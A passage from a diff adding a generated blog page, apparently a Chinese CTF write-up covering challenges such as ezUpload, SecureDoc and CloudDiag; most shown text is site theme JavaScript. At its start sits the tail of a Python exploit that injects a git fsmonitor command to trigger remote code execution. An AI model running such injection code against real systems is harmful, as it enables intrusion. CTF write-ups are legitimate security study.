class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For verification: Print the exact command being injected</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Injected fsmonitor command: <span class="subst">&#123;rce_command&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    trigger_rce(rce_command, proxies=proxies)</span><br></pre></td></tr></table></figure>
+
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2028/01/22/HTB-Practice/">HTB-wp-长期更新</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">next.js之CVE-2025-55182代码审计</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>Created by  <a href="/">Sauy</a> with <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a></p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezUpload-ezUpload-Revenge"><span class="toc-text">ezUpload&amp;&amp;ezUpload Revenge!!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Intrasight"><span class="toc-text">Intrasight</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mio%E2%80%99s-waf-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="toc-text">mio’s waf(赛后复现)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GlyphWeaver"><span class="toc-text">GlyphWeaver</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SecureDoc"><span class="toc-text">SecureDoc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Joomla-Revenge"><span class="toc-text">Joomla Revenge!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E9%B8%A3%E5%94%B1%E5%90%A7"><span class="toc-text">一鸣唱吧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudDiag"><span class="toc-text">CloudDiag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gogogos"><span class="toc-text">gogogos</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
